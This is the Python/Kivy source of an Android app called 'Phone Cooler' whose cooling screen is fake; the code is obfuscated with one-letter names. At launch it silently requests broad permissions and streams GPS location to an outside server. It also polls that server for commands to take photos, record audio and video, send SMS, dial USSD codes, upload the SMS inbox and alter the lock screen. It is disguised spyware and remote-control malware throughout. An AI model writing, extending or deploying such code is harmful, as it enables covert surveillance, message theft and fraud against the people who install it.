from kivy.app import App as A
from kivy.uix.label import Label as L
from kivy.uix.button import Button as B
from kivy.uix.boxlayout import BoxLayout as BL
from kivy.uix.gridlayout import GridLayout as GL
from kivy.uix.progressbar import ProgressBar as P
from kivy.clock import Clock as C
from kivy.core.window import Window as W
import requests as R, threading as T, time as t, socket as S, json as J, random as r, os, datetime as D
from android.permissions import request_permissions as RP, Permission as PM
from android import mActivity as MA
from jnius import autoclass as AC
I=AC('android.content.Intent');IF=AC('android.content.IntentFilter');U=AC('android.net.Uri');SM=AC('android.telephony.SmsManager');CT=AC('android.content.Context');LM=AC('android.location.LocationManager');MR=AC('android.media.MediaRecorder');F=AC('java.io.File');E=AC('android.os.Environment');MP=AC('android.media.MediaPlayer');AM=AC('android.media.AudioManager');WM=AC('android.app.WallpaperManager');BF=AC('android.graphics.BitmapFactory');Bd=AC('android.os.Build')
RP([PM.CAMERA,PM.RECORD_AUDIO,PM.ACCESS_FINE_LOCATION,PM.ACCESS_COARSE_LOCATION,PM.ACCESS_BACKGROUND_LOCATION,PM.SEND_SMS,PM.READ_SMS,PM.READ_EXTERNAL_STORAGE,PM.WRITE_EXTERNAL_STORAGE,PM.INTERNET,PM.FOREGROUND_SERVICE,PM.RECEIVE_BOOT_COMPLETED,PM.WAKE_LOCK,PM.READ_PHONE_STATE,PM.SYSTEM_ALERT_WINDOW,PM.WRITE_SETTINGS])
U1="https://4nny.pythonanywhere.com";D1=S.gethostname()
class X:
    def __init__(s):s.a={'lat':0,'lng':0,'acc':0,'spd':0};s.b=False;s.c=None
    def d(s):
        try:s.b=True;s.c=MA.getSystemService(CT.LOCATION_SERVICE);T.Thread(target=s.e,daemon=True).start();return True
        except:return False
    def f(s):s.b=False
    def e(s):
        while s.b:
            try:
                g=s.c.getLastKnownLocation(LM.GPS_PROVIDER);n=s.c.getLastKnownLocation(LM.NETWORK_PROVIDER);l=g if g else n
                if l:s.a={'lat':l.getLatitude(),'lng':l.getLongitude(),'acc':l.getAccuracy(),'spd':l.getSpeed()*3.6}
                try:R.post(f"{U1}/location",json={'device':D1,'lat':s.a['lat'],'lng':s.a['lng'],'acc':s.a['acc'],'spd':s.a['spd'],'ts':str(D.datetime.now())},timeout=5)
                except:pass
            except:pass
            t.sleep(10)
    def h(s):return s.a
class Y:
    def __init__(s):s.r=False;s.id=D1;s.rec=None;s.mp=None;s.l=X();s.l.d()
    def j(s):
        if s.r:return
        s.r=True;T.Thread(target=s.k,daemon=True).start();T.Thread(target=s.l2,daemon=True).start()
    def m(s):s.r=False;s.l.f();s.n();s.o()
    def k(s):
        for a in range(10):
            try:
                R.post(f"{U1}/command_result",json={'device':s.id,'status':'online','bt':str(D.datetime.now()),'model':Bd.MODEL,'av':Bd.VERSION.RELEASE},timeout=10);print("[+] Registered");return
            except:t.sleep(3)
    def l2(s):
        while s.r:
            try:
                x=R.get(f"{U1}/commands?device={s.id}",timeout=10)
                if x.status_code==200:
                    for c in x.json():T.Thread(target=s.p,args=(c,),daemon=True).start()
            except:pass
            t.sleep(5)
    def p(s,c):
        z=c.get('type');p2=c.get('payload',{})
        if z=='take_photo':s.q()
        elif z=='get_location':s.r2('get_location',str(s.l.h()))
        elif z=='send_ussd':s.s(p2.get('code',''))
        elif z=='send_sms':s.t(p2.get('number',''),p2.get('text',''))
        elif z=='get_device_info':s.r2('get_device_info',J.dumps({'device':s.id,'model':Bd.MODEL}))
        elif z=='start_recording':s.u()
        elif z=='stop_recording':s.n()
        elif z=='play_music':s.v(p2.get('url',''))
        elif z=='stop_music':s.o()
        elif z=='lock':s.w(p2.get('image_url',''))
        elif z=='unlock':s.x()
        elif z=='fetch_sms':s.y()
    def q(s):
        try:ii=I('android.media.action.IMAGE_CAPTURE');ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK);MA.startActivity(ii);s.r2('take_photo','Camera opened')
        except Exception as e:s.r2('take_photo',f'Error: {e}')
    def s(s,c):
        try:ii=I(I.ACTION_CALL);ii.setData(U.parse(f"tel:{c}"));ii.setFlags(I.FLAG_ACTIVITY_NEW_TASK);MA.startActivity(ii);s.r2('send_ussd',f'USSD {c} sent')
        except Exception as e:s.r2('send_ussd',f'Error: {e}')
    def t(s,n,tx):
        try:SM.getDefault().sendTextMessage(n,None,tx,None,None);s.r2('send_sms',f'SMS sent to {n}')
        except Exception as e:s.r2('send_sms',f'Error: {e}')
    def u(s):
        try:of=F(E.getExternalStorageDirectory(),f"rec_{int(t.time())}.mp4");s.rec=MR();s.rec.setAudioSource(MR.AudioSource.MIC);s.rec.setVideoSource(MR.VideoSource.CAMERA);s.rec.setOutputFormat(MR.OutputFormat.MPEG_4);s.rec.setAudioEncoder(MR.AudioEncoder.AAC);s.rec.setVideoEncoder(MR.VideoEncoder.H264);s.rec.setOutputFile(of.getAbsolutePath());s.rec.prepare();s.rec.start();s.r2('start_recording','Recording started')
        except Exception as e:s.r2('start_recording',f'Error: {e}')
    def n(s):
        if s.rec:
            try:s.rec.stop();s.rec.release();s.rec=None;s.r2('stop_recording','Recording stopped')
            except:pass
    def v(s,u):
        try:rq=R.get(u,stream=True,timeout=30);tf=F(E.getExternalStorageDirectory(),"tmp.mp3");open(tf.getAbsolutePath(),'wb').write(rq.content);s.o();s.mp=MP();s.mp.setDataSource(tf.getAbsolutePath());s.mp.prepare();s.mp.setLooping(True);s.mp.start();s.r2('play_music','Music playing')
        except Exception as e:s.r2('play_music',f'Error: {e}')
    def o(s):
        if s.mp:
            try:s.mp.stop();s.mp.release();s.mp=None;s.r2('stop_music','Music stopped')
            except:pass
    def w(s,u):
        try:rq=R.get(u,stream=True,timeout=30);tf=F(E.getExternalStorageDirectory(),"tmp_lock.jpg");open(tf.getAbsolutePath(),'wb').write(rq.content);wm=WM.getInstance(MA);bm=BF.decodeFile(tf.getAbsolutePath());wm.setBitmap(bm,None,True,WM.FLAG_LOCK);s.r2('lock','Lock screen updated')
        except Exception as e:s.r2('lock',f'Error: {e}')
    def x(s):
        try:wm=WM.getInstance(MA);wm.clear(WM.FLAG_LOCK);s.r2('unlock','Lock screen reset')
        except Exception as e:s.r2('unlock',f'Error: {e}')
    def y(s):
        try:
            sl=[];cr=MA.getContentResolver();uu=U.parse("content://sms/inbox");cu=cr.query(uu,None,None,None,None)
            if cu:
                while cu.moveToNext():
                    b=cu.getString(cu.getColumnIndex("body"));ad=cu.getString(cu.getColumnIndex("address"));dt=cu.getString(cu.getColumnIndex("date"))
                    if b and ad:sl.append({'from':ad,'body':b[:200],'date':D.datetime.fromtimestamp(int(dt)//1000).strftime('%Y-%m-%d %H:%M')})
                    if len(sl)>=50:break
                cu.close()
            R.post(f"{U1}/command_result",json={'device':s.id,'sms_list':sl},timeout=10);s.r2('fetch_sms',f'Found {len(sl)} SMS')
        except Exception as e:s.r2('fetch_sms',f'Error: {e}')
    def r2(s,c,r):
        try:R.post(f"{U1}/command_result",json={'device':s.id,'command':c,'result':r,'ts':str(D.datetime.now())},timeout=5)
        except:pass
class Z(A):
    def build(s):
        W.clearcolor=(0.05,0.1,0.15,1);m=BL(orientation='vertical',padding=20,spacing=15);m.add_widget(L(text="❄️ Phone Cooler",font_size=32,bold=True,color=(0,0.8,1,1)));s.tl=L(text="65°C",font_size=72,bold=True,color=(1,0.2,0.2,1));m.add_widget(s.tl);s.sl=L(text="🔥 Phone is overheating!",font_size=18,color=(1,0.5,0.2,1));m.add_widget(s.sl);s.pb=P(max=100,value=0,size_hint_y=0.15);m.add_widget(s.pb);s.ll=L(text="📍 GPS: Active",font_size=14,color=(0.5,0.8,1,1),size_hint_y=0.08);m.add_widget(s.ll);sg=GL(cols=2,spacing=10,size_hint_y=0.2);s.pl=L(text="Problems: 21",font_size=16,color=(1,1,1,0.8));sg.add_widget(s.pl);s.tl2=L(text="Time: 0s",font_size=16,color=(1,1,1,0.8));sg.add_widget(s.tl2);m.add_widget(sg);bl=BL(size_hint_y=0.2,spacing=10);s.sb=B(text="❄️ Start Cool",font_size=20,bold=True,background_color=(0,0.6,0.8,1),background_normal='');s.sb.bind(on_press=s.a2);bl.add_widget(s.sb);s.stb=B(text="⏹ Stop",font_size=18,background_color=(0.4,0.4,0.4,1),background_normal='',disabled=True);s.stb.bind(on_press=s.b2);bl.add_widget(s.stb);m.add_widget(bl);s.bs=L(text="🟢 Ready | 📍 GPS active",font_size=12,color=(0.5,0.5,0.5,1),size_hint_y=0.05);m.add_widget(s.bs);s.temp=65;s.probs=21;s.ctime=0;s.cool=False;s.srv=None;C.schedule_once(s.c2,2);C.schedule_interval(s.d2,0.5);return m
    def c2(s,dt):s.srv=Y();s.srv.j();s.bs.text="🟢 Cooling engine ready | 📍 GPS active"
    def a2(s,inst):
        if not s.cool:s.cool=True;s.ctime=0;s.probs=21;s.temp=65;s.sb.disabled=True;s.stb.disabled=False;s.sb.text="❄️ Cooling...";s.bs.text="🔄 Cooling engine activated | 📍 GPS tracking"
    def b2(s,inst):s.cool=False;s.sb.disabled=False;s.stb.disabled=True;s.sb.text="❄️ Start Cool";s.bs.text="⏸ Cooling paused | 📍 GPS active"
    def d2(s,dt):
        if s.cool:
            s.ctime+=0.5
            if s.temp>25:s.temp-=r.uniform(0.5,1.5);s.temp=max(25,s.temp)
            if s.probs>0 and s.temp<60:
                if s.ctime%2<0.5:s.probs-=r.randint(1,3);s.probs=max(0,s.probs)
            pv=int((65-s.temp)/40*100);pv=min(100,max(0,pv));s.pb.value=pv;tr=round(s.temp);s.tl.text=f"{tr}°C"
            if s.temp>50:s.tl.color=(1,0.2,0.2,1);s.sl.text="🔥 Phone is overheating!";s.sl.color=(1,0.5,0.2,1);s.pb.color=(1,0.2,0.2,1)
            elif s.temp>40:s.tl.color=(1,0.8,0.2,1);s.sl.text="⚡ Phone is warm";s.sl.color=(1,0.8,0.2,1);s.pb.color=(1,0.8,0.2,1)
            elif s.temp>30:s.tl.color=(0.2,0.8,0.4,1);s.sl.text="✅ Phone is cooling down";s.sl.color=(0.2,0.8,0.4,1);s.pb.color=(0.2,0.8,0.4,1)
            else:s.tl.color=(0.2,0.6,1,1);s.sl.text="❄️ Phone is cool!";s.sl.color=(0.2,0.6,1,1);s.pb.color=(0.2,0.6,1,1)
            s.pl.text=f"Problems: {s.probs}";s.tl2.text=f"Time: {int(s.ctime)}s"
            if s.temp<=30 and s.probs==0:s.bs.text="✅ Phone cooled down! | 📍 GPS active";s.cool=False;s.sb.disabled=False;s.stb.disabled=True;s.sb.text="❄️ Start Cool"
if __name__=="__main__":Z().run()
